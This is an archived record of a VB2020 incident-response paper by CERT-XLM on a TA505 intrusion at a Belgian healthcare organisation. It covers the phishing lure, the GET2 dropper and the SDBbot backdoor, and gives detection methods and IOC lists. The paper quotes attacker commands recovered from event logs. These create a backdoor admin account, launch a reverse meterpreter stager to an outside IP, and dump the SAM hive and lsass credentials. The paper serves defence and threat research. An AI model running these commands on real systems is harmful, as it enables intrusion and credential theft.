{
    "id": "6bead88e-7ea9-4d61-9204-338c671054e0",
    "created_at": "2022-10-25T16:48:12.592023Z",
    "updated_at": "2025-03-27T02:15:47.916416Z",
    "deleted_at": null,
    "sha1_hash": "1137d574278dedd79c844634a5d5239640fa5f40",
    "title": "VB2020 paper: Another threat actor day...",
    "authors": "",
    "file_creation_date": "2020-09-30T16:16:25Z",
    "file_modification_date": "2020-09-30T16:17:02Z",
    "file_size": 2799748,
    "plain_text": "**30 September - 2 October, 2020 / vblocalhost.com**\n\n\n-----\n\n**ABSTRACT**\n\nIn December 2019 our team CERT-XLM responded to an incident affecting a Belgian actor in the healthcare sector. This\nincident was a ransom operation run allegedly by the APT group TA505. This group is known for ransoming its victims, for\nexample Rouen Hospital in November 2019 and Maastricht University in December 2019. We intervened after the domain\ncompromise, but luckily just in time before a probable launch of the ransomware. During this incident, we learnt a lot about\nthe operational tactics of this group and the tools they use.\n\n**INITIAL COMPROMISE**\n\nOur customer was hit by two separate waves of phishing emails. The emails were sent to individuals’ mailboxes by using a\nRussian university MTA for injection. Both waves were large, each with more than 100 destination mailboxes. The\nphishing email fakes an invitation for a trial of the cloud storage Onehub.\n\n_Figure 1: Phishing email._\n\nThe email contained no attachment, but instead a shortened link using the legitimate German service (merky[.]de) to\nredirect the victims toward a macro-enabled Word document. The document was served from the attacker infrastructure,\nunder the host box-cnd[.]com.\n\n_Figure 2: Office document._\n\n\n-----\n\nIf the macro is allowed to be executed, a pop-up appears displaying a never-ending configuration status progress bar.\n\n_Figure 3: Decoy running._\n\nMeanwhile, the macro extracts an architecture-dependent DLL directly embedded in the document. Indeed, the document\ncontains two versions of the DLL, 32-bit and 64-bit, and depending on the system CPU, the corresponding one is executed.\n\nThis DLL is a dropper known as GET2, which was already extensively analysed by Proofpoint in mid October 2019. This\ndropper retrieves basic information from the host (computer name, username, version and running processes) and sends\nthem back to the CC using a simple HTTP POST request.\n\nIn our case the CC was microsoft-hub-us[.]com (195.123.246.12). Interestingly, the configuration of the unique CC host is\nhard coded in the DLL binary itself.\n\n_Figure 4: Configuration of CC._\n\nDepending on the POST response, ‘RD86’ or ‘RD86R’, the dropper then fetches (using the GET method) the final payload\nas a PE or a DLL.\n\n_Figure 5: PE download._\n\n\n-----\n\nDuring our investigation on patient 0, this dropper stored a new executable in the directory %UserProfile%\\AppData\\Local\\\nTemp\\ and named it ‘profile3.7.exe’. Unfortunately, this file was transient and despite traces of it on the patient 0 disk, we\ncould not retrieve it for further analysis. Therefore, the purpose of this file remains unknown.\n\nAfter getting the file, the dropper checks the validity of the executable and simply executes it. No persistence mechanism\nwas found at this stage.\n\n**REACH DA IN ONE HOUR**\n\nAfter the initial breach, the attackers installed a backdoor commonly named SDBbot. The backdoor is interesting on several\nlevels. On the one hand, it uses a clever persistence mechanism, while on the other hand it uses a simple and basic\ncommunication protocol. This backdoor allows the assailants to control the host. This implant is detailed more thoroughly\nin the next section.\n\nFour hours after the implant was installed, the attackers connected back to the target. One hour later, they used MS17-07\ndirectly against one domain controller to gain AD domain admin rights. The attackers then dropped a binary named\nwsus.exe, a repacked version of TinyMet, which is an open source small meterpreter stager hosted on GitHub. We found\nwsus.exe hidden in existing folders on some workstations – for example, it was c:\\intel, a remaining artefact of the video\ndriver installation.\n\nFrom the compromised DC, the attackers then used smbexec to execute commands on remote Windows systems without\nhaving to upload a payload to the target via native Windows functionality and SMB authentication. When launched,\nsmbexec creates a folder, c:/__output, and never deletes it, which was a key point to detect compromised servers. This tool\nalso registers by default a service named ‘BTOBTO’.\n\nSince event logging was enabled, we were able to retrieve many of the executed commands.\n\nTo ensure user persistence, they simply created a user and added it in the administrators group:\n\n%COMSPEC% /C echo net user support supp0rt /add ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\KZaNdsoCnKCqTtnw.\ntxt > \\WINDOWS\\Temp\\FhdnnrGoOdmOlqEr.bat & %COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\\nFhdnnrGoOdmOlqEr.bat\n\n%COMSPEC% /C echo net localgroup administrators support /add ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\\nIFKtLFGtTTyQImhx.txt > \\WINDOWS\\Temp\\scAYndDUIHixjwDv.bat & %COMSPEC% /C start %COMSPEC% /C \\\nWINDOWS\\Temp\\scAYndDUIHixjwDv.bat\n\nAgain, they used smbexec to launch TinyMet, simply by specifying the host and port directly to the command line. ‘0’\nmeans reverse TCP:\n\n%COMSPEC% /C echo C:\\Windows\\wsus.exe 0 91.214.124.15 443 ^> %SYSTEMDRIVE%\\WINDOWS\\Temp\\\niaetRnAqpruNtWFZ.txt > \\WINDOWS\\Temp\\wmCiqaHkZzuHNNMT.bat & %COMSPEC% /C start %COMSPEC% /C \\\nWINDOWS\\Temp\\wmCiqaHkZzuHNNMT.bat\n\nThe IP 91.214.124.15 belongs to the AS210119, the geolocation seems to be in Ukraine but the owner of the AS is in the\nSeychelles. The group used this same and unique Ukrainian meterpreter backend during the whole operation.\n\nTo extract the domain credentials, the assailants used multiple solutions. We do not know if this is a standard procedure for\nthem or if they just ran into issues. They used reg.exe to extract the SAM database, then dumped the lsass process using\n_procdump tools from sysinternals and finally using the pwdump tool:_\n\n%COMSPEC% /Q /c echo reg.exe save hklm\\sam C:\\Intel\\sam ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 >\n%TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\n\n%COMSPEC% /Q /c echo reg.exe save hklm\\security C:\\Intel\\security ^> \\\\127.0.0.1\\C$\\__output\n2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\n\n%COMSPEC% /Q /c echo reg.exe save hklm\\system C:\\Intel\\system ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 >\n%TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\n\n%COMSPEC% /Q /c echo C:\\Intel\\procdump.exe -accepteula -ma lsass.exe lsass.dmp ^> \\\\127.0.0.1\\\nC$\\__output 2^>^&1 > %TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\\nexecute.bat\n\n%COMSPEC% /Q /c echo C:\\Intel\\pwdump.exe > C:\\Intel\\pw ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 >\n%TEMP%\\execute.bat & %COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\n\nFinally, once full domain compromise was achieved, the attackers pivoted through the entire network again using smbexec\nand launched Metasploit as TCP listen meterpreter in order to plant SDBbot backdoors in more than 50 servers and\nworkstations.\n\n\n-----\n\n_Figure 6: Meterpreter run._\n\nFor fun, we will now allow readers to make their own attribution conclusions :-)\n\n%COMSPEC% /Q /c echo ping google.ca ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat &\n%COMSPEC% /Q /c %TEMP%\\execute.bat & del %TEMP%\\execute.bat\n\n**THE PE RSISTENCE IMPLANT**\n\nSDBbot uses a clever persistence method. The malware, when deployed with simple user privileges, is mostly fileless. The\nbinary including the CC configuration is stored in the registry along with a little randomly named DLL to bootstrap it. The\npersistence is set with a simple start-up key using rundll32 to launch the payload:\n\nKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\nxrbvajc.dll: rundll32 \"C:\\Users\\[redacted]\\AppData\\Roaming\\xrbvajc.dll\" #1\n\nThe bootstrap DLL is also hard coded with the path containing the UID where the payload resides in the registry.\nTherefore, each binary hash is unique. The configuration is obfuscated in the data section of the DLL.\n\n_Figure 7: Configuration dump._\n\nThe second stage payload is also stored in a random path of the registry to achieve sneakiness. It is located in HKEY_\nCURRENT_USER\\Software\\Microsoft\\{3 random letters}\\{1 random letter}\n\n_Figure 8: Malware in registry._\n\n\n-----\n\nThe Registry entry always starts with a decoy text ‘Copyright (C) Microsoft Corporation.’, followed by a shellcode with the\ncompressed final payload concatenated to it. The launcher just allocates memory and jumps on the shellcode, the shellcode\nuncompress SDBbot and finally runs it.\n\nTo summarize, the random launcher is randomly named using a payload randomly placed in the registry. This matter can\ncertainly complicate the incident response for an unprepared client. Luckily for us, even if it is really stealthy at the binary\nlevel, it still uses the simple registry Currentversion/run for persistence.\n\nMoreover, it is really noisy and easy to detect at network level. At every launch, in order to find out the victim’s external IP,\nSDBbot calls the ip-api.com services with an hard-coded user agent:\n\n_Figure 9: Hard-coded user agent._\n\nThen the bot uses a binary protocol to talk to the CC. In addition, although TCP is used with destination port 443, the traffic\nis not encrypted with SSL, making the beaconing easy to spot. The sequence of bytes sent in the payload is 00 00 DE C0,\nfor which the CC will respond with 00 00 DE C0, hereafter referred to as the «DEC0» handshake.\n\nThe malware is a simple backdoor with the following capabilities:\n\n - Download of files\n\n - Command execution\n\n - Stream the screen content\n\n - Forward TCP session\n\n - Perform reboot\n\nThis malware was analysed in depth by Proofpoint in October 2019. Therefore, we will not go into it further. Unfortunately,\nat the time of the incident response we were not aware of that.\n\nOn most compromised hosts, SDBbot was found running with system rights, in this case, it runs not as a dedicated process but\ninjected in the winlogon process. In this configuration scenario, the second stage is located in HKEY_LOCAL_MACHINE\\\nSoftware\\Microsoft\\{3 random letters}\\{1 random letter} and persistence is achieved by using the same mechanism as FIN7,\ndiscovered by FireEye in 2017 called application shimming (Att&ck T1138). In this case, the host persistence is tricky to find.\n\nAt the beginning of our investigations, we did not immediately realize that the attackers used only a single CC for all the\nSDBbot samples, making it a challenge to block them without blocking all traffic towards the Internet. However, we\ndiscovered that the malware has the capacity to read a file named ip.txt if present at the root of the c:\\ or in the running\nfolder. This file overrides the hard-coded IP of the CC, which allowed us to block every SDBbot, surprisingly, without any\nrestart of the malware.\n\n_Figure 10: Hard-coded additional configuration file._\n\nAnother way to detect SDBbot was to apply the following YARA rules on all the running ‘winlogon’ processes:\n\nrule sdbbot {\nmeta: description = \"Find SDBBOT and Get Conf\"\nauthor = \"CERT-XLM\"\ndate = \"2019/12/19\"\nstrings: $re0 = /Hosts=[a-zA-z0-9\\-.]{5,32}/\ncondition: all of ($re*)\n}\n\n\n-----\n\n_Figure 11: Malware detection in memory._\n\nLuckily, by combining these detections, additional port scanning to find the internal listening meterpreter and looking for\nc:\\__output folders, we were able to detect infected hosts, cut the communications channels and contain this attack.\n\nIt is important to look at the timeline of actions of objectives, sample generation and domain registration to find out that\nthis group has probably been using the same techniques for months and have mastered their procedures. On the one hand\nthey are re-using tools pre-generated months ago, but on the other hand they act blazingly quickly when it comes to\ngenerating maldocs, registering the dropping domain and taking over the infrastructure.\n\n_Figure 12: Timeline._\n\nIt ha s been 21 days from the breach to the mitigation of the intruder. Hopefully the ransom was not launch ed during this\ntimeframe.\n\n**FINDING SDBBOTS**\n\nSo how do we hunt down SDBbot instances in the wild? You can find a lot of IOCs relative to the maldocs and GET2, but\nSDBbot IOCs and samples themselves are quite rare both on VirusTotal and in public sandboxes. That is because all the\nbots are quite unique and stored only in the registry, and even the unique launcher executable doesn’t contain any\nconfiguration.\n\nOnce you suspect an IP, it is trivial to validate that the host is really a SDBbot CC by using the famous ‘DEC0’ handshake.\nHowever, scanning port 443 on the whole Internet is still quite a painful process.\n\nNevertheless, during our investigation we found that some domains are sometimes reused by the group both for document\ndistribution and SDBbot CC.\n\nWe also saw domain names reused for the SDBbot CC. For example, the domain drm-server-booking[.]com resolved to\n185.33.86.40 (AS202015) from 16 October 2019 to 29 October, then to 88.99.112.82 (AS24940) from 6 November 2019\nuntil our intervention.\n\n\n-----\n\n_Figure 13: DNS name reuse._\n\nAlthough there is always a separation between the dropper CC and the SDBbot CC, they sometimes live on the same AS.\nFor example, the SDBbot CC drm-server-booking.com at 88.99.112.82 used in December 2019 is on the same AS 24940 as\nsmn-002.onedire-cdn.com at 88.99.112.92 used for maldoc delivery in October 2019.\n\nFurthermore, by cross-checking public IOCs allegedly belonging to this group, we also discovered domains with the same\npeculiar pattern ‘dash glued words’. For example:\n\n - drm-server-booking.com\n\n - Microsoft-store-drm-server.com\n\n - Microsoft-sback-server.com\n\nor\n\n - update365-office-ens.com\n\n - update365-update-en-gb.com\n\n - office365-update-eu.com\n\nor\n\n - Windows-msd-update.com\n\n - Windows-fsd-update.com\n\n - Windows-sys-update.com\n\n - Windows-se-update.com\n\n - Windows-en-us-update.com\n\nWe then considered that, since it may be complicated or time consuming for the group to find ‘bad actor’-friendly hosts, the\ngroup might simply reuse the same AS for both CC and droppers even if the servers are segregated. With this hypothesis,\nwe started to map all known used domains by using IP/FQDN pivoting to find more domains and IPs, starting in 2019 and\nusing only dash and .com tld.\n\nWe extracted words from all the known IOC domains. For example, the list for drm.server.booking gives the labels\n\n[‘drm’,’server’,’booking’]. Then we resolved each combination of two and three words to find a hosting AS.\n\n - drm-server-booking.com\n\n - server-booking-drm.com\n\n - booking-drm-servers.com\n\n - Etc...\n\nAll the IOCs collected and attributed to this group gave us 124 distinct labels, resolving to only 1,900 hosts covering 397\nAS ranges. We scanned these ranges with a SDBbot NSE script replaying the DEC0 handshake:\n\n_Figure 14: SDBbot NSE detection script._\n\n\n-----\n\nBy using this method, we discovered 11 running SDBbot servers, 10 of them still active in June 2020. All SDBbot CC seem\nto run on Linux, mostly Ubuntu 18.04, but also Debian 10 and a few Ubuntu 16.4.\n\nInterestingly, port 443, perhaps due to the strange ‘DEC0’ handshake, is always invisible to Shodan for all the SDBbot CCs\nwe found, and most of them listen on TCP port 800. We were not, however, able to identify this service.\n\n_Figure 15: SDBbot Shodan result._\n\n_Figure 16: Nmap result._\n\nFinally, we were able to map the infrastructure of SDBbot with active CCs in June 2020:\n\n_Figure 17: SDBbot infrastructure._\n\n**CONCLUSION**\n\nThe attack performed by this group shows good tactics and operational security practices. They use simple but efficient\ntools. The implementation strategy of SDBbot limits the diffusion of the samples and the related IOCs, which allows this\ngroup to operate quietly. Added to this, in June 2020, Telekom announced the discovery of SDBbot samples using TLS and\ncertificate pinning to render their detection in internal LANs and worldwide discovery far more complicated.\n\n\n-----\n\n**IOCs**\n\n**Used tools**\n\nTinymet\nSmbexec\nProcdump\nPwdump\nMeterpreter\nGET2\nSdbbot\n\n**SDBbot IPs**\n\n190.211.254.224\n192.161.167.165\n23.152.0.152\n192.52.167.233\n92.38.135.217\n158.255.208.148\n158.255.208.168\n51.38.82.162\n212.83.46.170\n212.83.46.170\n190.211.254.224\n\n**SDBbot ho stnames**\n\neu-global.com\nauxin-box.com\ndrm-google-analtyic.com\ndrm-server-booking.com\ndrm-server13-login-microsoftonline.com\neu-global-online.com\nfacebook-drm-server3.com\njp-microsoft-store.com\nstatic-google-analtyic.com\nnews-server-drm-google.com\n\n**Domains all egedly belonging to TA505**\n\natt-downloa d.com\nauxin-box.com\nbox-cnd.com\nbox-en-au.com\ncdn-box.com\ncdn-downloads.com\ncdn-onedrive-live.com\nclients-share.com\nclietns-download.com\nclouds-cdn.com\nclouds-doanload-cnd.com\nclouds-share.com\ncloud-store-cnd.com\n\n\n-----\n\ndl-icloud.com\ndl-sharefile.com\ndl-sync.com\ndownload-cdn.com\ndownload-shares.com\ndrm-google-analtyic.com\ndrm-server13-login-microsoftonline.com\ndrm-server-booking.com\ndyn-downloads.com\neu-global.com\neu-global-online.com\nfacebook-drm-server3.com\nfile-downloads.com\nfileshare-cdns.com\nfileshare-storage.com\ngeneral-lcfd.com\nget-downloads.com\ngetlink-service.com\nglobal-logic-stl.com\nglr-ltd.com\ngoogledrive-en.com\ngoogledrive-eu.com\nhome-storages.com\nint-download.com\ninteger-ms-home.com\ninto-box.com\ni-sharecloud.com\njp-microsoft-store.com\nlive-cnd.com\nlive-en.com\nlive-en.com\nlive-msr.com\nmainten-ferrum.com\nmicrosoft-cnd.com\nmicrosoft-cnd-en.com\nmicrosoft-home-en.com\nmicrosoft-hub-us.com\nmicrosoft-live-us.com\nmicrosoft-sback-server.com\nmicrosoft-store-drm-server.com\nmicrosoft-store-en.com\nmicrosoft-ware.com\nms-break.com\nms-en-microsoft.com\nms-global-store.com\nms-home-store.com\nmsonebox.com\nms-rdt.com\nms-upgrades.com\n\n\n-----\n\noffice365-update-eu.com\n\nonedrive-cdn.com\n\nonedrive-download.com\nonedrive-download-en.com\nonedrive-live-en.com\nonedrive-sdn.com\nonedrives-en-live.com\none-drive-storage.com\nonehub-en.com\nowncloud-cnd.com\nreselling-corp.com\nselling-group.com\nshare-clouds.com\nshared-cnd.com\nshared-downloading.com\nshare-downloading.com\nsharefile-cnd.com\nsharefile-en.com\nsharefiles-download.com\nshares-cdns.com\nshares-cloud.com\nsharespoint-en.com\nshare-stores.com\nshr-links.com\nstat-downloads.com\nstatic-downloads.com\nstatic-google-analtyic.com\nstore-in-box.com\nstt-box.com\nstudio-stlsdr.com\ntnrff-home.com\nupdate365-office-ens.com\nwindows-en-us-update.com\nwindows-fsd-update.com\nwindows-msd-update.com\nwindows-office365.com\nwindows-se-update.com\nwindows-sys-update.com\nwindows-wsus-en.com\nwindows-wsus-eu.com\nwpad-home.com\nxbox-en-cnd.com\n\n**ATT&CK REFERENCES**\n\n[1] Spear Phishing Link https://attack.mitre.org/techniques/T1192/.\n\n[2] User Execution https://attack.mitre.org/techniques/T1204/.\n\n[3] Application Shimming https://attack.mitre.org/techniques/T1138/.\n\n[4] Registry run keys https://attack.mitre.org/techniques/T1060/.\n\n\n-----\n\n[5] Rundll32 https://attack.mitre.org/techniques/T1085/.\n\n[6] Exploitation for privilege escalation https://attack.mitre.org/techniques/T1068/.\n\n[7] Process Injection https://attack.mitre.org/techniques/T1055/.\n\n[8] Credential dumping https://attack.mitre.org/techniques/T1003/.\n\n[9] Commonly used port https://attack.mitre.org/techniques/T1043/.\n\n[10] Exfiltration over CC Channel https://attack.mitre.org/techniques/T1041/.\n\n**REFERENCES**\n\n[1] https://github.com/SherifEldeeb/TinyMet.\n\n[2] https://malpedia.caad.fkie.fraunhofer.de/actor/ta505.\n\n[3] https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-ApplicationCompatibility-Shims-wp.pdf.\n\n[4] https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2downloader.\n\n[5] https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html.\n\n[6] https://www.telekom.com/en/blog/group/article/cybersecurity-ta505-returns-with-a-new-bag-of-tricks-602104.\n\n[7] Twitter @AdamTheAnalyst.\n\n[8] Twitter @stoerchl.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://vblocalhost.com/uploads/VB2020-Jung.pdf"
    ],
    "report_names": [
        "VB2020-Jung.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bfded1cf-be73-44f9-a391-0751c9996f9a",
            "created_at": "2022-10-25T15:50:23.337107Z",
            "updated_at": "2025-03-27T02:00:55.445946Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "FIN7",
                "GOLD NIAGARA",
                "ITG14",
                "Carbon Spider",
                "ELBRUS",
                "Sangria Tempest"
            ],
            "source_name": "MITRE:FIN7",
            "tools": [
                "Mimikatz",
                "AdFind",
                "JSS Loader",
                "HALFBAKED",
                "REvil",
                "PowerSploit",
                "CrackMapExec",
                "Carbanak",
                "Pillowmint",
                "Cobalt Strike",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRat",
                "Lizar",
                "TEXTMATE",
                "BOOSTWRITE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "bb8702c5-52ac-4359-8409-998a7cc3eeaf",
            "created_at": "2023-01-06T13:46:38.405479Z",
            "updated_at": "2025-03-27T02:00:02.82533Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "JokerStash",
                "ATK32",
                "G0046",
                "Coreid",
                "Carbanak",
                "Sangria Tempest",
                "CARBON SPIDER",
                "GOLD NIAGARA",
                "G0008",
                "ELBRUS",
                "Carbon Spider"
            ],
            "source_name": "MISPGALAXY:FIN7",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d85adfe3-e1c3-40b0-b8bb-d1bacadc4d82",
            "created_at": "2022-10-25T16:07:23.619566Z",
            "updated_at": "2025-03-27T02:02:09.890982Z",
            "deleted_at": null,
            "main_name": "FIN7",
            "aliases": [
                "APT-C-11",
                "ATK 32",
                "Gold Niagara",
                "ITG14",
                "TAG-CR1"
            ],
            "source_name": "ETDA:FIN7",
            "tools": [
                "7Logger",
                "Agentemis",
                "Anunak",
                "Astra",
                "BIOLOAD",
                "BIRDWATCH",
                "Bateleur",
                "Boostwrite",
                "CROWVIEW",
                "Carbanak",
                "Cobalt Strike",
                "CobaltStrike",
                "DICELOADER",
                "DNSMessenger",
                "FOWLGAZE",
                "HALFBAKED",
                "JSSLoader",
                "KillACK",
                "LOADOUT",
                "Lizar",
                "Meterpreter",
                "Mimikatz",
                "POWERPLANT",
                "POWERSOURCE",
                "RDFSNIFFER",
                "SQLRAT",
                "Sekur",
                "Sekur RAT",
                "TEXTMATE",
                "Tirion",
                "VB Flash",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716492,
    "ts_updated_at": 1743041747,
    "ts_creation_date": 1601482585,
    "ts_modification_date": 1601482622,
    "files": {
        "pdf": "https://archive.orkl.eu/1137d574278dedd79c844634a5d5239640fa5f40.pdf",
        "text": "https://archive.orkl.eu/1137d574278dedd79c844634a5d5239640fa5f40.txt",
        "img": "https://archive.orkl.eu/1137d574278dedd79c844634a5d5239640fa5f40.jpg"
    }
}